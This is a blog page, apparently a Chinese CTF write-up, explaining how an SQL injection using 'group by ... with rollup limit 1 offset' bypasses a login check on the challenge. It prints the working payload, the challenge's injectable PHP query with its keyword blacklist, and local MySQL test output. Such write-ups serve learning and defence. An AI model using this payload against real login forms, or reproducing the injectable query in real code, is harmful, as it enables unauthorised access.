@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    
+    <title>实验吧-因吹斯汀的绕过-writeup - Hexo</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="payload11&amp;#x27; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2 #  后台核心代码123456789101112131415$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;mysql_select_db($db, $con)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧-因吹斯汀的绕过-writeup">
+<meta property="og:url" content="https://0xr1ngs.github.io/2018/07/12/interesting/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="payload11&amp;#x27; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2 #  后台核心代码123456789101112131415$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;mysql_select_db($db, $con)">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-07-12T12:10:50.000Z">
+<meta property="article:modified_time" content="2023-07-10T07:29:11.732Z">
+<meta property="article:author" content="r1ngs">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688978534305">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1688978534305">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1688978534305">
+        
+    
+
+    
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+
+
+    <script async src="/js/app.js?v=1688978534305"></script>
+    
+     
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" 
+            style="background-image: url(/images/wallpaper.png)"
+        ></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="r1ngs" class="mdui-btn mdui-btn-icon"><img src="/images/avator.jpg" alt="r1ngs"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="r1ngs">
+            <img src="/images/avator.jpg" alt="r1ngs" alt="r1ngs">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>10</div>
+        <div><span>Tags</span>9</div>
+        <div><span>Categories</span>1</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+        
+            
+            <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+        
+            
+            <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://github.com/0xr1ngs/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Categories</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sqli/" style="font-size: 10px;">sqli</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 20px;">总结</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(9);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/19/Java-Jndi/">Jndi注入</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">LGP_内网渗透</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/31/java-random/">java_random</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/28/cbc-bit-flip/">cbc_bit_flip</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/xss/">xss</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+        
+    </aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 r1ngs
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+    <div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="/images/wallpaper.png" alt="实验吧-因吹斯汀的绕过-writeup" loading="lazy">
+            <h1>实验吧-因吹斯汀的绕过-writeup</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2018年07月12日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span> group by pwd with rollup limit <span class="number">1</span> offset <span class="number">2</span> #</span><br></pre></td></tr></table></figure>
+
+<h1 id="后台核心代码"><a href="#后台核心代码" class="headerlink" title="后台核心代码"></a>后台核心代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM interest WHERE uname = &#x27;<span class="subst">&#123;$_POST[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$query</span>) == <span class="number">1</span>) &#123; </span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">&#x27;pwd&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;CTF&#123;XXXXXX&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;亦可赛艇！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;一颗赛艇！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>带入uname的值查询 如果查询结果的行的数目为1的话（查询成功）继续执行,如果输入的pwd和查询的pwd相同的话输出flag</p>
+<h1 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> demo <span class="keyword">where</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> password <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> admin888 <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user1 <span class="operator">|</span> pass2    <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> pass3    <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> demo <span class="keyword">where</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> password <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> password <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> admin888 <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user1 <span class="operator">|</span> pass2    <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> pass3    <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>or 1&#x3D;1可以返回所有的结果，而如果查询的结果超过两行，with rollup就会多返回一行，并且password（由group by 决定）为NULL，再加入limit 1就可以只返回一行，而用offset，表示返回哪一行，null结果是在最后一行插入的，所以offset要指向最后一行，但我们并不知道最后一行的行数是几，所以用二分法测试 超过行数的话就会返回empty set，也就是没有返回一行而查询失败，所以只要测试出最后null的行数，此时查询成功返回的就是任意的一个uname和password为NULL的结果，此时密码一项不填为空，null和null相等就可以得到flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> demo <span class="keyword">where</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> password <span class="keyword">with</span> <span class="keyword">rollup</span></span><br><span class="line">limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> password <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/sql/" rel="tag">sql</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1688978534245"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+</div>
+        <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="toc-number"></span> <span class="toc-text">后台核心代码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95"><span class="toc-number"></span> <span class="toc-text">本地测试</span></a>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
